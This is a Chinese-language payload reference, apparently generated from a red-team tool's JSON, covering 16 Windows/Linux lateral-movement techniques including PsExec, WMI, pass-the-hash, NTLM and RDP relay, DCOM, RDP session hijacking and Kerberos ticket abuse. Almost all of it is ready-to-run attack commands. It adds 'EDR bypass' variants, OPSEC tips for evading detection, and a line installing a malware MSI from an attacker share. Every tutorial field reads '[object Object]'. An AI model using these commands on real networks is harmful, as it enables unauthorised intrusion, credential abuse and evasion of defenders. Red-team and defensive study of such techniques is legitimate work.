# 横向移动 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（16 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. PsExec横向移动

- **id:** `lateral-psexec`
- **分类:** 横向移动 / SMB
- **tags:** `psexec` `lateral` `smb` `windows`

使用PsExec进行横向移动

**前置条件**

- 目标机器开放445端口
- 拥有目标机器管理员凭证
- ADMIN$共享可访问

**利用步骤**

#### 基本使用

```
psexec.py domain/user:password@target_ip
```

使用Impacket的psexec.py连接目标

| 片段 | 说明 | 类型 |
|---|---|---|
| `psexec.py` | Impacket工具，实现PsExec功能 | command |
| `domain/user:password` | 认证信息格式 | value |
| `@target_ip` | 目标IP地址 | value |

> platform: `linux`

#### 使用哈希连接

```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```

使用NTLM哈希进行Pass-the-Hash

| 片段 | 说明 | 类型 |
|---|---|---|
| `-hashes` | 指定哈希认证 | parameter |
| `:NTLM_HASH` | NTLM哈希值(LM:NTLM格式，LM留空) | value |

> platform: `linux`

#### 执行命令

```
psexec.py domain/user:password@target_ip "whoami"
```

在目标机器执行命令

> platform: `linux`

#### Windows PsExec

```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```

使用Sysinternals PsExec

| 片段 | 说明 | 类型 |
|---|---|---|
| `\\target_ip` | 目标机器IP | value |
| `-u` | 指定用户名 | parameter |
| `-p` | 指定密码 | parameter |

> platform: `windows`

**EDR 绕过**

#### 自定义服务名

```
psexec.py -service-name CustomService domain/user:password@target_ip
```

使用自定义服务名避免检测

#### SMBExec替代

```
smbexec.py domain/user:password@target_ip
```

使用smbexec.py，不写入磁盘

**OPSEC**

- PsExec会在目标机器创建服务，容易被检测
- 服务名称和二进制文件可能触发告警
- 考虑使用更隐蔽的横向移动方式

**教程**

[object Object]

---

### 2. WMI横向移动

- **id:** `lateral-wmi`
- **分类:** 横向移动 / WMI
- **tags:** `wmi` `lateral` `windows` `remote`

使用WMI进行横向移动

**前置条件**

- 目标机器开放135端口
- 拥有目标机器管理员凭证
- WMI服务可访问

**利用步骤**

#### WMI执行命令

```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```

使用WMIC远程执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `wmic` | Windows管理工具命令行 | command |
| `/node:` | 指定目标机器 | parameter |
| `/user:` | 指定用户名 | parameter |
| `process call create` | 调用创建进程方法 | command |

> platform: `windows`

#### Impacket wmiexec

```
wmiexec.py domain/user:password@target_ip
```

使用Impacket的wmiexec.py

| 片段 | 说明 | 类型 |
|---|---|---|
| `wmiexec.py` | Impacket WMI执行工具 | command |

> platform: `linux`

#### 使用哈希

```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

Pass-the-Hash通过WMI

> platform: `linux`

#### PowerShell WMI

```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```

使用PowerShell WMI

| 片段 | 说明 | 类型 |
|---|---|---|
| `Invoke-WmiMethod` | PowerShell WMI方法调用 | command |
| `Win32_Process` | WMI进程类 | value |
| `-ComputerName` | 目标计算机名 | parameter |

> platform: `windows`

**EDR 绕过**

#### WMI事件订阅

```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

通过WMI安装MSI包执行代码

**OPSEC**

- WMI执行不会留下明显的文件痕迹
- 但WMI活动可能被监控
- 命令输出通过临时文件获取

**教程**

[object Object]

---

### 3. Pass-the-Hash攻击

- **id:** `pass-the-hash`
- **分类:** 横向移动 / 认证攻击
- **tags:** `pth` `ntlm` `hash` `authentication`

使用NTLM哈希进行身份验证

**前置条件**

- 获取用户NTLM哈希
- 目标机器允许NTLM认证
- 目标机器开放SMB/WMI端口

**利用步骤**

#### Impacket PtH

```
psexec.py -hashes :NTHASH domain/user@target_ip
```

使用Impacket进行PtH

| 片段 | 说明 | 类型 |
|---|---|---|
| `-hashes` | 指定哈希认证 | parameter |
| `:NTHASH` | NTLM哈希(LM:NTLM格式) | value |

> platform: `linux`

#### CrackMapExec PtH

```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```

使用CrackMapExec进行PtH

| 片段 | 说明 | 类型 |
|---|---|---|
| `crackmapexec smb` | CrackMapExec SMB模块 | command |
| `-H` | 指定NTLM哈希 | parameter |

> platform: `linux`

#### Windows PtH

```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

使用Mimikatz进行PtH

> platform: `windows`

#### PowerShell PtH

```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

使用PowerShell进行PtH

> platform: `windows`

**EDR 绕过**

#### Overpass-the-Hash

```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

将哈希转换为Kerberos票据

**OPSEC**

- PtH不会产生登录日志中的密码验证
- 但会留下网络登录日志
- 注意时间戳和来源IP

**教程**

[object Object]

---

### 4. NTLM Relay攻击

- **id:** `ntlm-relay`
- **分类:** 横向移动 / 认证攻击
- **tags:** `ntlm` `relay` `smb` `authentication`

NTLM中继攻击技术

**前置条件**

- 目标机器开放SMB端口
- 目标机器未启用SMB签名
- 可诱导目标机器认证

**利用步骤**

#### Responder监听

```
responder -I eth0 -wrf
```

启动Responder监听NTLM认证

| 片段 | 说明 | 类型 |
|---|---|---|
| `responder` | NTLM/LLMNR/NBT-NS欺骗工具 | command |
| `-I` | 指定网络接口 | parameter |
| `-wrf` | 启用WPAD、Finger、FTP服务 | parameter |

> platform: `linux`

#### ntlmrelayx攻击

```
ntlmrelayx.py -tf targets.txt -smb2support
```

使用ntlmrelayx进行中继攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `ntlmrelayx.py` | Impacket NTLM中继工具 | command |
| `-tf` | 目标文件 | parameter |
| `-smb2support` | 支持SMB2协议 | parameter |

> platform: `linux`

#### 中继到LDAP

```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

中继到LDAP进行权限提升

> platform: `linux`

#### IPv6中继

```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

使用IPv6进行NTLM中继

> platform: `linux`

**EDR 绕过**

#### Drop the MIC

```
ntlmrelayx.py -t smb://target --remove-mic
```

移除MIC标志绕过签名验证

**OPSEC**

- 需要目标机器未启用SMB签名
- 域控制器默认启用签名
- IPv6中继更隐蔽

**教程**

[object Object]

---

### 5. WinRM横向移动

- **id:** `lateral-winrm`
- **分类:** 横向移动 / WinRM
- **tags:** `winrm` `lateral` `powershell`

通过WinRM进行横向移动

**前置条件**

- WinRM启用
- 有效凭证

**利用步骤**

#### PowerShell远程

```
Enter-PSSession -ComputerName target -Credential $cred
```

PowerShell远程会话

| 片段 | 说明 | 类型 |
|---|---|---|
| `Enter-PSSession` | 进入远程PowerShell会话 | command |
| `-ComputerName target` | 目标计算机名 | parameter |
| `-Credential $cred` | 凭据对象 | parameter |

> platform: `windows`

#### 执行命令

```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

远程执行命令

> platform: `windows`

#### evil-winrm

```
evil-winrm -i target -u user -p password
```

使用evil-winrm连接

> platform: `linux`

**教程**

[object Object]

---

### 6. DCOM横向移动

- **id:** `lateral-dcom`
- **分类:** 横向移动 / DCOM
- **tags:** `dcom` `lateral` `com`

通过DCOM进行横向移动

**前置条件**

- DCOM启用
- 有效凭证

**利用步骤**

#### MMC20.Application

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```

通过MMC DCOM执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `MMC20.Application` | MMC COM对象 | value |
| `ExecuteShellCommand` | 执行Shell命令方法 | function |
| `"7"` | 窗口状态参数 | value |

> platform: `windows`

#### ShellBrowserWindow

```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

通过ShellBrowserWindow执行

> platform: `windows`

#### Excel DCOM

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

通过Excel DCOM执行

> platform: `windows`

**教程**

[object Object]

---

### 7. SSH横向移动

- **id:** `lateral-ssh`
- **分类:** 横向移动 / SSH
- **tags:** `ssh` `lateral` `linux`

通过SSH进行横向移动

**前置条件**

- SSH服务
- 有效凭证

**利用步骤**

#### SSH连接

```
ssh user@target
```

基础SSH连接

> platform: `linux`

#### SSH密钥认证

```
ssh -i private_key user@target
```

使用私钥连接

| 片段 | 说明 | 类型 |
|---|---|---|
| `-i private_key` | 指定私钥文件 | parameter |
| `user@target` | 用户名和目标地址 | value |

> platform: `linux`

#### SSH跳板

```
ssh -J jump_host user@target
```

通过跳板机连接

> platform: `linux`

**教程**

[object Object]

---

### 8. RDP会话劫持

- **id:** `rdp-hijack`
- **分类:** 横向移动 / RDP
- **tags:** `rdp` `hijack` `session`

劫持已存在的RDP会话

**前置条件**

- SYSTEM权限
- 存在RDP会话

**利用步骤**

#### 列出会话

```
query user
```

列出所有用户会话

> platform: `windows`

#### 劫持会话

```
tscon SESSION_ID /dest:console
```

劫持指定会话

| 片段 | 说明 | 类型 |
|---|---|---|
| `tscon` | 终端服务连接命令 | command |
| `SESSION_ID` | 目标会话ID | variable |
| `/dest:console` | 连接到当前控制台 | parameter |

> platform: `windows`

#### 使用Mimikatz

```
ts::sessions
ts::remote /id:SESSION_ID
```

使用Mimikatz劫持

> platform: `windows`

**教程**

[object Object]

---

### 9. Overpass-the-Hash

- **id:** `overpass-the-hash`
- **分类:** 横向移动 / PtH
- **tags:** `pth` `kerberos` `hash`

使用哈希获取Kerberos票据

**前置条件**

- 用户NTLM哈希
- 域环境

**利用步骤**

#### Mimikatz

```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```

使用哈希获取Kerberos票据

| 片段 | 说明 | 类型 |
|---|---|---|
| `sekurlsa::pth` | Pass-the-Hash模块 | command |
| `/ntlm:HASH` | 用户NTLM哈希 | parameter |
| `/ptt` | Pass-the-Ticket，注入票据 | parameter |

> platform: `windows`

#### Rubeus

```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

使用Rubeus获取票据

> platform: `windows`

#### Impacket

```
getTGT.py domain.com/user -hashes :HASH
```

获取Kerberos票据

> platform: `linux`

**教程**

[object Object]

---

### 10. Pass-the-Ticket

- **id:** `pass-the-ticket`
- **分类:** 横向移动 / PtT
- **tags:** `ptt` `kerberos` `ticket`

使用Kerberos票据进行横向移动

**前置条件**

- 有效Kerberos票据

**利用步骤**

#### 导出票据

```
sekurlsa::tickets /export
```

从内存导出Kerberos票据

> platform: `windows`

#### 注入票据

```
kerberos::ptt ticket.kirbi
```

注入票据到当前会话

| 片段 | 说明 | 类型 |
|---|---|---|
| `kerberos::ptt` | Pass-the-Ticket模块 | command |
| `ticket.kirbi` | Kerberos票据文件 | path |

> platform: `windows`

#### Rubeus导入

```
Rubeus.exe ptt /ticket:base64ticket
```

使用Rubeus注入票据

> platform: `windows`

**教程**

[object Object]

---

### 11. SMBExec横向移动

- **id:** `lateral-smbexec`
- **分类:** 横向移动 / SMB
- **tags:** `smb` `lateral` `exec`

通过SMB执行命令

**前置条件**

- SMB访问权限
- 管理员权限

**利用步骤**

#### Impacket smbexec

```
smbexec.py domain/user:password@target
```

使用smbexec执行命令

> platform: `linux`

#### 通过服务执行

```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```

创建并启动服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `sc \\target` | 远程服务控制 | domain |
| `create evilsvc` | 创建服务 | keyword |
| `binPath=` | 服务执行路径 | parameter |

> platform: `windows`

**教程**

[object Object]

---

### 12. ATExec横向移动

- **id:** `lateral-atexec`
- **分类:** 横向移动 / 计划任务
- **tags:** `at` `scheduled` `lateral`

通过计划任务执行命令

**前置条件**

- 计划任务权限
- 管理员权限

**利用步骤**

#### Impacket atexec

```
atexec.py domain/user:password@target "whoami"
```

使用atexec执行命令

> platform: `linux`

#### schtasks

```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```

创建远程计划任务

| 片段 | 说明 | 类型 |
|---|---|---|
| `/s target` | 目标计算机 | parameter |
| `/tn "evil"` | 任务名称 | parameter |
| `/tr` | 任务执行的程序 | parameter |
| `/sc once` | 执行一次 | parameter |

> platform: `windows`

**教程**

[object Object]

---

### 13. WinRS横向移动

- **id:** `lateral-winrs`
- **分类:** 横向移动 / WinRS
- **tags:** `winrs` `lateral` `windows`

通过WinRS执行远程命令

**前置条件**

- WinRM启用
- 有效凭证

**利用步骤**

#### 执行命令

```
winrs -r:target -u:user -p:password "whoami"
```

远程执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `-r:target` | 远程目标 | parameter |
| `-u:user` | 用户名 | parameter |
| `-p:password` | 密码 | parameter |

> platform: `windows`

#### 获取Shell

```
winrs -r:target -u:user -p:password "cmd"
```

获取远程CMD

> platform: `windows`

**教程**

[object Object]

---

### 14. Excel DCOM横向移动

- **id:** `lateral-dcom-excel`
- **分类:** 横向移动 / DCOM
- **tags:** `dcom` `excel` `lateral`

利用Excel DCOM进行横向移动

**前置条件**

- 目标安装Excel
- DCOM权限

**利用步骤**

#### Excel DCOM激活

```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

激活Excel DCOM对象

> platform: `windows`

#### 执行命令

```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```

通过Excel执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `Excel.Application` | Excel COM对象 | keyword |
| `=CMD|/C` | DDE命令注入 | keyword |

> platform: `windows`

#### Impacket DCOM

```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

使用Impacket执行

> platform: `linux`

**教程**

[object Object]

---

### 15. MMC DCOM横向移动

- **id:** `lateral-dcom-mmc`
- **分类:** 横向移动 / DCOM
- **tags:** `dcom` `mmc` `lateral`

利用MMC DCOM进行横向移动

**前置条件**

- 目标安装MMC
- DCOM权限

**利用步骤**

#### MMC20.Application

```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

使用MMC执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `MMC20.Application` | MMC COM对象 | value |
| `ExecuteShellCommand` | 执行Shell命令方法 | function |

> platform: `windows`

#### Impacket执行

```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

使用Impacket

> platform: `linux`

**教程**

[object Object]

---

### 16. RDP Relay攻击

- **id:** `rdp-relay`
- **分类:** 横向移动 / RDP
- **tags:** `rdp` `relay` `lateral`

RDP中继攻击技术

**前置条件**

- RDP服务可访问
- 存在NTLM认证

**利用步骤**

#### 设置中继

```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

设置RDP中继服务器

> platform: `linux`

#### 诱导连接

```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

诱导用户连接

#### PetitPotam组合

```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```

PetitPotam + RDP Relay

> platform: `linux`

**教程**

[object Object]
